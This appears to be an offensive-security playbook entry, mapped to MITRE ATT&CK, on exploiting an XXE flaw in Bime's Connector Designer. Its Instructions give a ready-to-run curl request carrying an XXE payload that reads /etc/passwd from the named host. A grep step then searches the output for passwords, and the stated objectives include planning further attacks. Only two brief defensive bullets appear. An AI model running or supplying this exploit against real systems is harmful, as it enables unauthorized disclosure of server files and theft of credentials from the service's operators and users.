---
tags:
  - xxe
  - exfiltration
type: procedure
tools:
  - '[[tools/Curl]]'
tactics:
  - '[[Collection]]'
commands:
  - '[[commands/curl-send-xml-payload]]'
platforms:
  - Web
techniques:
  - '[[Exploit Public-Facing Application]]'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
id: e49b94f5-7e56-4699-8aa7-37531b82e294
created_at: '2025-12-13T09:00:27.595Z'
updated_at: '2025-12-13T09:00:27.595Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Collection]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Extract and Analyze Disclosed Files

## Summary

This procedure covers extracting and reviewing files disclosed via XXE exploitation in Bime's Connector Designer, analyzing for sensitive data.

## Description

After successful XXE, responses contain file contents. This step involves parsing outputs, targeting additional files, and assessing impact, as per the reported vulnerability's potential for information disclosure.

## Requirements
1. Successful XXE response with file data
2. Tools for text processing (e.g., grep)
3. Secure environment for handling sensitive data

## Defense

Defensive measures and detection strategies:
- Log and alert on large or unusual response sizes
- Restrict file system permissions on sensitive files

## Objectives
1. Collect disclosed data
2. Identify valuable information
3. Plan further attacks if applicable

## Instructions

### Step 1: Capture Response

**Context**: Save the exploitation response for analysis.

Execute [[commands/curl-send-xml-payload]] with output redirection:

```bash
curl -X POST https://target.bime.io/connector-designer -H "Content-Type: application/xml" -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>' > output.txt
```

> This saves the disclosed file to output.txt.

### Step 2: Analyze Content

**Context**: Search for sensitive patterns in the output.

Use grep to filter:

```bash
grep -i 'root|password' output.txt
```

> Look for credentials, configs, or other secrets.

## MITRE ATT&CK Mapping

### Tactics
- [[Collection]]

### Techniques
- [[Exploit Public-Facing Application]]

### Sub-Techniques

## Commands Used
- [[commands/curl-send-xml-payload]]

## Tools Used
- [[tools/Curl]]

## Tags
- [[xxe]]
- [[Exfiltration]]
